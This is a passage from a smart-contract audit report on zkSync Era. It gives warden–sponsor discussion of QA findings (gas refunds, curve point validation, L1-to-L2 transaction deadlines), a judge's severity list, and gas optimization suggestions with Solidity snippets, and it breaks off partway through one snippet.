> https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L918
> 
> In order to have `refundGas > gasLimit` (to have DoS as mentioned by the warden) the following condition should be met:
>
> ```
> max(getOperatorRefundForTx(transactionIndex), potentialRefund) + totalGasLimit - max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex)) > gasLimit
> ```
>
> Since `totalGasLimit` is the same as `gasLimit`, we will have:
>
> ```
> max(getOperatorRefundForTx(transactionIndex), potentialRefund) > max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))
> ```
>
> This is possible if the operator provides refund higher than `max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))`. Moreover, if the operator provides such large refund amount, the bootloader will be reverted at line 924, so nothing happens, it is kind of self-rekt for the operator. It is as if the operator provides very low gas at the beginning to run the bootloader, so the bootloader will revert, and he should run it again.

**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835695581):**
 > [40] is QA at most. Yes, it is an additional cost for users. So, it is the fact that we have written `DefaultAccount` in Solidity & not in Yul. This is the price everyone pays for better support.

**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835704171):**
 > > For [39], `expirationTimestamp` is not used anywhere. It is set, but it is not responsible for any logic currently. It will be used in the future implementations. This report can be used in Analysis report. 

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835853346):**
 > @miladpiri - Regarding [19]: You can just check the boolean, that's true, but it will return true for both of them, as the tests and the mathematical proof highlight. All signatures and some ZK things rely on the correctness of this curve and the **UNIQUENESS** of the points in there. If you can craft two different points that are gonna be treated as the same one, even if one of them is not on the curve, then you can replay the original one with the wrong one. When you say
> 
> >  The warden's own test cases confirm that the code handles both points correctly, so there is no impact.
> 
> The code must not accept `(0, 1)`. The result is wrong. `(0, 1)` is not on the curve and it is not the zero element. They must revert like in `from_xy_checked`. Moreover, it is the purpose of `is_on_curve` function to return false for those points and prevent the parent function from going on with an invalid point. Math structures like this curve and all the operations defined under it must be correctly implemented for a reason. Right now, from a formal POV, this is not the real secp256k1 curve. It mimics how it works, but it is not the same.

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835866806):**
 > @miladpiri - Regarding [38]: In fact, it is worse, as every point added with its negated will be treated as the zero element. That means you can have infinite zero elements (up to the prime field) who all are **DIFFERENT** from each other and from `(0, 1, 0)` floating around.

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835896481):**
 > @miladpiri - Regarding [12], You said
> 
> > This is possible if the operator provides refund higher than `max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))`.
> 
> This is correct and I did not take into account, so the DOS part is invalid. However, the theft of gas from the operator by users is correct as the bootloader is checking what is higher; the calculated refund for the execution of the transaction or the value provided by the operator, which is returning **HIS** reserved gas plus the leftover gas he has found for such a transaction. That means the operator's value will always be picked and being added with reserved gas will output more gas than intended.
>
> The code responsible for that in the zkSync Era node is in [refunds.rs, line 253](https://github.com/matter-labs/zksync-era/blob/0cd2c6b5ada568ffe01bce6d2dd8951457369141/core/lib/multivm/src/versions/vm_latest/tracers/refunds.rs#L253):
> 
> ```rust
>             ...
> 
>             let tx_gas_limit = state
>                 .memory
>                 .read_slot(
>                     BOOTLOADER_HEAP_PAGE as usize,
>                     tx_description_offset + TX_GAS_LIMIT_OFFSET,
>                 )
>                 .value
>                 .as_u32();
> 
>             ...
> 
>             let tx_body_refund = self.tx_body_refund(
>                 bootloader_refund,
>                 gas_spent_on_pubdata,
>                 tx_gas_limit,
>                 current_ergs_per_pubdata_byte,
>                 pubdata_published,
>             );
> 
>             ...
> ```
> 
> If we go to `tx_body_refund` we see that the refund provided by the operator is, roughly, `gasLimitFromUser - gasSpentInComputation - gasSpentInPubdata`, that is, the excess of gas provided by the user, or, in other terms, the refund of gas after the execution step plus the reserved gas:
> 
> [refunds.rs, function `tx_body_refund`](https://github.com/matter-labs/zksync-era/blob/0cd2c6b5ada568ffe01bce6d2dd8951457369141/core/lib/multivm/src/versions/vm_latest/tracers/refunds.rs#L95)
> 
> ```rust
>     pub(crate) fn tx_body_refund(
>         &self,
>         bootloader_refund: u32,
>         gas_spent_on_pubdata: u32,
>         tx_gas_limit: u32,
>         current_ergs_per_pubdata_byte: u32,
>         pubdata_published: u32,
>     ) -> u32 {
>         let total_gas_spent = tx_gas_limit - bootloader_refund;
> 
>         let gas_spent_on_computation = total_gas_spent
>             .checked_sub(gas_spent_on_pubdata)
>             .unwrap_or_else(|| {
>                 tracing::error!(
>                     "Gas spent on pubdata is greater than total gas spent. On pubdata: {}, total: {}",
>                     gas_spent_on_pubdata,
>                     total_gas_spent
>                 );
>                 0
>             });
> 
>         // For now, bootloader charges only for base fee.
>         let effective_gas_price = self.l1_batch.base_fee();
> 
>         let bootloader_eth_price_per_pubdata_byte =
>             U256::from(effective_gas_price) * U256::from(current_ergs_per_pubdata_byte);
> 
>         let fair_eth_price_per_pubdata_byte =
>             U256::from(eth_price_per_pubdata_byte(self.l1_batch.l1_gas_price));
> 
>         // For now, L1 originated transactions are allowed to pay less than fair fee per pubdata,
>         // so we should take it into account.
>         let eth_price_per_pubdata_byte_for_calculation = std::cmp::min(
>             bootloader_eth_price_per_pubdata_byte,
>             fair_eth_price_per_pubdata_byte,
>         );
> 
>         let fair_fee_eth = U256::from(gas_spent_on_computation)
>             * U256::from(self.l1_batch.fair_l2_gas_price)
>             + U256::from(pubdata_published) * eth_price_per_pubdata_byte_for_calculation;
>         let pre_paid_eth = U256::from(tx_gas_limit) * U256::from(effective_gas_price);
>         let refund_eth = pre_paid_eth.checked_sub(fair_fee_eth).unwrap_or_else(|| {
>             tracing::error!(
>                 "Fair fee is greater than pre paid. Fair fee: {} wei, pre paid: {} wei",
>                 fair_fee_eth,
>                 pre_paid_eth
>             );
>             U256::zero()
>         });
> 
>         ceil_div_u256(refund_eth, effective_gas_price.into()).as_u32()
>     }
> ```

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1836025283):**
 > @miladpiri - Regarding [39], I understand; however, I'm not talking about deposits staying idle or not being executed in zkSync Era due to high congestion in Ethereum for days. I am referencing time-sensitive  `L1->L2` transactions via `requestL2Transaction`.
> 
> The issue is that it's fine to put that *"hard-coded"*  deadline for deposits, as the *"environment changes"* they suffer from are minimal, but there is no way for a contract in Ethereum to set a deadline of, say, a few minutes, for the execution of his transaction on zkSync Era, leading to the impacts I mentioned above. Neither it is possible now nor when you actually implement the logic regarding the withdrawals without operator's help. 
> 
> I focused on `expirationTimestamp`, as it is wrong to assume that `msg.timestamp` equals the time the user submitted the transaction to the network and when the transaction is actually picked and executed on-chain, which affects **ALL** `L1->L2` transactions, whether they are simple deposits or not, and the fact it will be used for all types of transactions, whether the caller wants that deadline or not.
> 
> As the intention as well as the *"Ethereum counterpart"* is implemented in the code in-scope for this audit, plus the real threat rogue nodes in Ethereum are for the network as stated in the real-world [examples](https://news.bitcoin.com/rogue-validator-exploits-mev-bots-on-ethereum-resulting-in-25-3m-in-crypto-losses). Please reconsider, as users must be able to put the deadline they want/need for their transactions. Otherwise, transactions going to zkSync Era from Ethereum will become prime target of MEV bots and rogue nodes, due to the "sequential determinism" of your `L1->L2` communication channel.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1848941661):**
> [01] - TODO<br>
> [02] - Refactor<br>
> [03] - Ignored<br>
> [04] - Refactor<br>
> [05] - Low<br>
> [06] - TODO<br>
> [07] - Non-Critical<br>
> [08] - Ignored<br>
> [09] - Non-Critical<br>
> [10] - TODO<br>
> [11] - Low<br>
> [12] - Refactor<br>
> [13] - Non-Critical<br>
> [14] - Ignored<br>
> [15] - Low<br>
> [16] - Low<br>
> [17] - TODO<br>
> [18] - Low<br>
> [19] - Ignored<br>
> [20] - Low<br>
> [21] - Refactor<br>
> [22] - Non-Critical<br>
> [23] - Non-Critical<br>
> [24] - Non-Critical<br>
> [25] - Low<br>
> [26] - Non-Critical<br>
> [27] - Non-Critical<br>
> [28] - Low<br>
> [29] - Non-Critical<br>
> [30] - Refactor<br>
> [31] - Low<br>
> [32] - Refactor<br>
> [33] - Refactor<br>
> [34] - Low<br>
> [35] - Low<br>
> [36] - Ignored<br>
> [37] - Non-Critical<br>
> [38] - Non-Critical<br>
> [39] - Low<br>
> [40] - Non-Critical<br>
> [41] - Ignored<br>

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*

***

# Gas Optimizations

For this audit, 9 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-10-zksync-findings/issues/338) by **lsaudit** received the top score from the judge.

*The following wardens also submitted reports: [0xhacksmithh](https://github.com/code-423n4/2023-10-zksync-findings/issues/1050), [hunter\_w3b](https://github.com/code-423n4/2023-10-zksync-findings/issues/924), [SM3\_SS](https://github.com/code-423n4/2023-10-zksync-findings/issues/624), [c3phas](https://github.com/code-423n4/2023-10-zksync-findings/issues/1058), [albahaca](https://github.com/code-423n4/2023-10-zksync-findings/issues/1037), [0xAnah](https://github.com/code-423n4/2023-10-zksync-findings/issues/1034), [0xsomeone](https://github.com/code-423n4/2023-10-zksync-findings/issues/732), and [Sathish9098](https://github.com/code-423n4/2023-10-zksync-findings/issues/55).*

As stated in the scope, the Gas Report had been prepared for L1 contracts only.

## [G-01] Pre-calculate keccak256 for constant variables in `L2ContractHelper.sol`

[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L12C5-L12C13)

```
bytes32 constant CREATE2_PREFIX = keccak256("zksyncCreate2");
```

## [G-02] Length of `_bytecode` is calculated twice in `L2ContractHelper.sol`

Calculating length of bytes every time costs gas. The better solution would be to calculate the length once and save it in a local variable:

[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L23-L25)
```
        require(_bytecode.length % 32 == 0, "pq");

        uint256 bytecodeLenInWords = _bytecode.length / 32;
```

Can be changed to:

```
		uint256 _bytecodeLength = _bytecode.length;
        require(_bytecodeLength % 32 == 0, "pq");

        uint256 bytecodeLenInWords = _bytecodeLength / 32;
```

## [G-03] `require` in `hashL2Bytecode` in `L2ContractHelper.sol` can be moved on top

[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L23-L26)

```
        require(_bytecode.length % 32 == 0, "pq");

        uint256 bytecodeLenInWords = _bytecode.length / 32;
        require(bytecodeLenInWords < 2**16, "pp"); // bytecode length must be less than 2^16 words
```

Since `_bytecode.length` is divisible by 32 (the first `require`), we know, that we can divide `_bytecode.length` by 32, without a remainder.

Let's take a look at the 2nd `require`:

`bytecodeLenInWords < 2**16  =>  _bytecode.length / 32 < 2**16  => _bytecode.length < 2**16 * 32  => _bytecode.length < 2**21`

This implies that we can rewrite above code snippet as:

```
        require(_bytecode.length % 32 == 0, "pq");
        require(_bytecode.length < 2**21, "pp"); // bytecode length must be less than 2^16 words
        uint256 bytecodeLenInWords = _bytecode.length / 32;
        
```

That way, when `_bytecode.length` is too big, we will revert immediately, instead of wasting gas on executing line: `uint256 bytecodeLenInWords = _bytecode.length / 32`. That line will be executed after the 2nd `require`.

Moreover, please keep in mind, to cache `_bytecode.length` into local variable - as it was suggested in `G-02`:

```
        uint256 _bytecodeLength = _bytecode.length;
        require(_bytecodeLength % 32 == 0, "pq");
        require(_bytecodeLength < 2**21, "pp"); // bytecode length must be less than 2^16 words
        uint256 bytecodeLenInWords = _bytecodeLength / 32;
```

## [G-04] Unnecessary variables in `L2ContractHelper.sol`

**Function `validateBytecodeHash`:**

Variable `version` is used only once, which means, it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L40-L41)
```
        uint8 version = uint8(_bytecodeHash[0]);
        require(version == 1 && _bytecodeHash[1] == bytes1(0), "zf"); // Incorrectly formatted bytecodeHash
```

To:

```
require(uint8(_bytecodeHash[0]) == 1 && _bytecodeHash[1] == bytes1(0), "zf"); // Incorrectly formatted bytecodeHash
```

**Function `computeCreate2Address`:**

Variables `senderBytes`, `data` are used only once, which means, they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L66-L71)

```
        bytes32 senderBytes = bytes32(uint256(uint160(_sender)));
        bytes32 data = keccak256(
            bytes.concat(CREATE2_PREFIX, senderBytes, _salt, _bytecodeHash, _constructorInputHash)
        );

        return address(uint160(uint256(data)));
```

To:

```
        return address(uint160(uint256(keccak256(bytes.concat(CREATE2_PREFIX, bytes32(uint256(uint160(_sender))), _salt, _bytecodeHash, _constructorInputHash)))));
```

## [G-05] Unnecessary variable in `AllowList.sol`

**Function `_setPermissionToCall`:**

Variable `currentPermission` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/common/AllowList.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/AllowList.sol#L117-L119)

```
 bool currentPermission = hasSpecialAccessToCall[_caller][_target][_functionSig];

        if (currentPermission != _enable) {
```

To:

```
        if (hasSpecialAccessToCall[_caller][_target][_functionSig] != _enable) {
```

## [G-06] Length of `_factoryDeps` is calculated multiple of times in `_verifyFactoryDeps` in `BaseZkSyncUpgrade.sol`.

Calculating length of array cost gas. Instead of doing it every time, calculate it once and assign that value to local variable.

`_factoryDeps.length` is being calculated:
- ` require(_factoryDeps.length == _expectedHashes.length, "Wrong number of factory deps");`  in the 1st `require`.
- `require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, "Factory deps can be at most 32");` in the 2nd `require`.
- `for (uint256 i = 0; i < _factoryDeps.length; ++i) {` in loop (this one was reported in the bot-race).

[File: ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L201-L204)

```
        require(_factoryDeps.length == _expectedHashes.length, "Wrong number of factory deps");
        require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, "Factory deps can be at most 32");

        for (uint256 i = 0; i < _factoryDeps.length; ++i) {
```

## [G-07] Unnecessary variable in `BridgeInitializationHelper.sol`

**Function `requestDeployTransaction`:**
Variable `deployCalldata` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/common/AllowList.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/libraries/BridgeInitializationHelper.sol#L37-L49)

```
        bytes memory deployCalldata = abi.encodeCall(
            IL2ContractDeployer.create2,
            (bytes32(0), _bytecodeHash, _constructorData)
        );
        _zkSync.requestL2Transaction{value: _deployTransactionFee}(
            L2_DEPLOYER_SYSTEM_CONTRACT_ADDR,
            0,
            deployCalldata,
            DEPLOY_L2_BRIDGE_COUNTERPART_GAS_LIMIT,
            REQUIRED_L2_GAS_PRICE_PER_PUBDATA,
            _factoryDeps,
            msg.sender
        );
```

To:

```
        _zkSync.requestL2Transaction{value: _deployTransactionFee}(
            L2_DEPLOYER_SYSTEM_CONTRACT_ADDR,
            0,
            abi.encodeCall(
            IL2ContractDeployer.create2,
            (bytes32(0), _bytecodeHash, _constructorData)
        ),
            DEPLOY_L2_BRIDGE_COUNTERPART_GAS_LIMIT,
            REQUIRED_L2_GAS_PRICE_PER_PUBDATA,
            _factoryDeps,
            msg.sender
        );
```

## [G-08] Unnecessary variables in `L1WethBridge.sol`

**Function `initialize`:**

Variables `l2WethBridgeImplementationBytecodeHash` and `l2WethBridgeProxyBytecodeHash` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L98-L133)

```
        bytes32 l2WethBridgeImplementationBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[0]);
        bytes32 l2WethBridgeProxyBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[1]);

        // Deploy L2 bridge implementation contract
        address wethBridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeImplementationFee,
            l2WethBridgeImplementationBytecodeHash,
            "", // Empty constructor data
            _factoryDeps // All factory deps are needed for L2 bridge
        );

(...)

        // Deploy L2 bridge proxy contract
        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeProxyFee,
            l2WethBridgeProxyBytecodeHash,
            l2WethBridgeProxyConstructorData,
            // No factory deps are needed for L2 bridge proxy, because it is already passed in the previous step
            new bytes[](0)
        );
```

To:

```
 
        // Deploy L2 bridge implementation contract
        address wethBridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeImplementationFee,
            L2ContractHelper.hashL2Bytecode(_factoryDeps[0]);,
            "", // Empty constructor data
            _factoryDeps // All factory deps are needed for L2 bridge
        );

(...)
        // Deploy L2 bridge proxy contract
        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeProxyFee,
            L2ContractHelper.hashL2Bytecode(_factoryDeps[1]),
            l2WethBridgeProxyConstructorData,
            // No factory deps are needed for L2 bridge proxy, because it is already passed in the previous step
            new bytes[](0)
        );
```

**Function `finalizeWithdrawal`:**

Variables `alreadyFinalised`, `l2ToL1Message` and `success` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L245-L254)

```
bool alreadyFinalised = zkSync.isEthWithdrawalFinalized(_l2BatchNumber, _l2MessageIndex);
        if (alreadyFinalised) {
            // Check that the specified message was actually sent while withdrawing eth from L2.
            L2Message memory l2ToL1Message = L2Message({
                txNumberInBatch: _l2TxNumberInBatch,
                sender: L2_ETH_TOKEN_SYSTEM_CONTRACT_ADDR,
                data: _message
            });
            bool success = zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, l2ToL1Message, _merkleProof);
            require(success, "vq");
```

To:

```
        if (zkSync.isEthWithdrawalFinalized(_l2BatchNumber, _l2MessageIndex)) {
            require(zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, L2Message({
                txNumberInBatch: _l2TxNumberInBatch,
                sender: L2_ETH_TOKEN_SYSTEM_CONTRACT_ADDR,
                data: _message
            }), _merkleProof), "vq");
```

## [G-09] Check if `amount` is greater than zero before performing `safeTransfer` in `L1WethBridge.sol`

[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L263)

```
        IERC20(l1WethAddress).safeTransfer(l1WethWithdrawReceiver, amount);
```

`safeTransfer`'ing  when `amount = 0` is a waste of gas, since there will be no funds transferred.
To save gas, check if `amount` is greater than `0`, before calling `safeTransfer`.

## [G-10] Do not assign `offset` in the last call of `UnsafeBytes.readAddress` in `L1WethBridge.sol`

A simple test in Remix IDE has been created, to compare gas usage of assigning more than one value from function call:

```
  function getUints() public pure returns (uint, uint) {return (1, 2);}
   function getAll() public view {
    uint a; uint b; 
    (a, b) = getUints();
    uint g = gasleft();
    (a, b) = getUints();
    console.log(g - gasleft());
   }
    function getOne() public view {
    uint a; uint b; 
    (a, b) = getUints();
    uint g = gasleft();
    (a, ) = getUints();
    console.log(g - gasleft());
   }
```

`getOne()` costs 74 gas, while `getAll()` costs 82 gas. This implies, that we shouldn't assign every parameter from function call if it's not needed. In the last call of `UnsafeBytes.readAddress(_message, offset)` (line 298):

[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L298)

```
(l1WethReceiver, offset) = UnsafeBytes.readAddress(_message, offset);
```

We won't need `offset` anymore, thus we can change line 298 to: `(l1WethReceiver, ) = UnsafeBytes.readAddress(_message, offset)`.

## [G-11] Unnecessary variables in `L1ERC20Bridge.sol`

**Function `initialize`:**

Variables `l2WethBridgeImplementationBytecodeHash` and `l2WethBridgeProxyBytecodeHash` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L99-L130)

```
        bytes32 l2BridgeImplementationBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[0]);
        bytes32 l2BridgeProxyBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[1]);

        // Deploy L2 bridge implementation contract
        address bridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeImplementationFee,
            l2BridgeImplementationBytecodeHash,
            "", // Empty constructor data
            _factoryDeps // All factory deps are needed for L2 bridge
        );

(...)

        // Deploy L2 bridge proxy contract
        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeProxyFee,
            l2BridgeProxyBytecodeHash,
            l2BridgeProxyConstructorData,
            // No factory deps are needed for L2 bridge proxy, because it is already passed in previous step
            new bytes[](0)
        );
```

To:

```
        // Deploy L2 bridge implementation contract
        address bridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeImplementationFee,
            L2ContractHelper.hashL2Bytecode(_factoryDeps[0]),
            "", // Empty constructor data
            _factoryDeps // All factory deps are needed for L2 bridge
        );

(...)

        // Deploy L2 bridge proxy contract
        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(
            zkSync,
            _deployBridgeProxyFee,
            L2ContractHelper.hashL2Bytecode(_factoryDeps[1]),
            l2BridgeProxyConstructorData,
            // No factory deps are needed for L2 bridge proxy, because it is already passed in previous step
            new bytes[](0)
        );
```

**Function `_depositFunds`:**

Variable `balanceAfter` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L219-L221)

```
        uint256 balanceAfter = _token.balanceOf(address(this));

        return balanceAfter - balanceBefore;
```

To:

```
return _token.balanceOf(address(this)) - balanceBefore;
```

**Function `claimFailedDeposit`:**

Variable `proofValid` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L264-L272)

```
 bool proofValid = zkSync.proveL1ToL2TransactionStatus(
            _l2TxHash,
            _l2BatchNumber,
            _l2MessageIndex,
            _l2TxNumberInBatch,
            _merkleProof,
            TxStatus.Failure
        );
        require(proofValid, "yn");
```

To:

```
        require(zkSync.proveL1ToL2TransactionStatus(
            _l2TxHash,
            _l2BatchNumber,
            _l2MessageIndex,
            _l2TxNumberInBatch,
            _merkleProof,
            TxStatus.Failure
        ), "yn");
```

**Function `finalizeWithdrawal`:**

Variable `success` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L311-L312)

```
            bool success = zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, l2ToL1Message, _merkleProof);
            require(success, "nq");
```

To:

```
            require(zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, l2ToL1Message, _merkleProof), "nq");
```

**Function `l2TokenAddress`:**

Variables `constructorInputHash` and `salt` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L354-L357)

```
        bytes32 constructorInputHash = keccak256(abi.encode(address(l2TokenBeacon), ""));
        bytes32 salt = bytes32(uint256(uint160(_l1Token)));

        return L2ContractHelper.computeCreate2Address(l2Bridge, salt, l2TokenProxyBytecodeHash, constructorInputHash);
```

To:

```
        return L2ContractHelper.computeCreate2Address(l2Bridge, bytes32(uint256(uint160(_l1Token))), l2TokenProxyBytecodeHash, keccak256(abi.encode(address(l2TokenBeacon), "")));
```

## [G-12] Calculation which won't underflow can be unchecked in `L1ERC20Bridge.sol`

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L221)

```
return balanceAfter - balanceBefore;
```

Since `balanceAfter` contains token's balance after the transfer, and `balanceBefore` contains token's balance before the transfer, we know, that `balanceAfter >= balanceBefore`, thus `balanceAfter - balanceBefore` will never underflow and can be unchecked.

## [G-13] Check if `amount` is greater than zero before performing `safeTransfer` in `L1ERC20Bridge.sol`

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L317)

```
        IERC20(l1Token).safeTransfer(l1Receiver, amount);
```

`safeTransfer`'ing  when `amount = 0` is a waste of gas, since there will be no funds transferred. To save gas, check if `amount` is greater than `0`, before calling `safeTransfer`.

## [G-14] Do not assign `offset` in the last call of `UnsafeBytes.readUint256` in `L1ERC20Bridge.sol`

A simple test in Remix IDE has been created, to compare gas usage of assigning more than one value from function call:

```
  function getUints() public pure returns (uint, uint) {return (1, 2);}
   function getAll() public view {
    uint a; uint b; 
    (a, b) = getUints();
    uint g = gasleft();
    (a, b) = getUints();
    console.log(g - gasleft());
   }
    function getOne() public view {
    uint a; uint b; 
    (a, b) = getUints();
    uint g = gasleft();
    (a, ) = getUints();
    console.log(g - gasleft());
   }
```

`getOne()` costs 74 gas, while `getAll()` costs 82 gas. This implies, that we shouldn't assign every parameter from function call if it's not needed.

In the last call of `UnsafeBytes.readUint256(_l2ToL1message, offset)` (line 336):

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L336)

```
(amount, offset) = UnsafeBytes.readUint256(_l2ToL1message, offset);
```

We won't need `offset` anymore, thus we can change line 336 to: `(amount, ) = UnsafeBytes.readUint256(_l2ToL1message, offset);`.

## [G-15] One + operation is redundant in `_verifyDepositLimit` in `L1ERC20Bridge.sol`

[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L346-L349)

```
 } else {
            require(totalDepositedAmountPerUser[_l1Token][_depositor] + _amount <= limitData.depositCap, "d1");
            totalDepositedAmountPerUser[_l1Token][_depositor] += _amount;
        }
```

We don't need to add `amount` twice. Firstly, to check `require` statement, and secondly, to increase `totalDepositedAmountPerUser[_l1Token][_depositor]`. We can change the order of `require` to do so:

```
 } else {
            
            totalDepositedAmountPerUser[_l1Token][_depositor] += _amount;
            require(totalDepositedAmountPerUser[_l1Token][_depositor]  <= limitData.depositCap, "d1");
        }
```

If `totalDepositedAmountPerUser[_l1Token][_depositor] + _amount` exceeds `limitData.depositCap`, we will still revert.

To prove, that this will indeed save some gas, a minimalized code snippet in Remix IDE has been prepared:

```
mapping(address => mapping(address => uint256)) public totalDepositedAmountPerUser;
function current(uint _amount) public {
    uint g = gasleft();
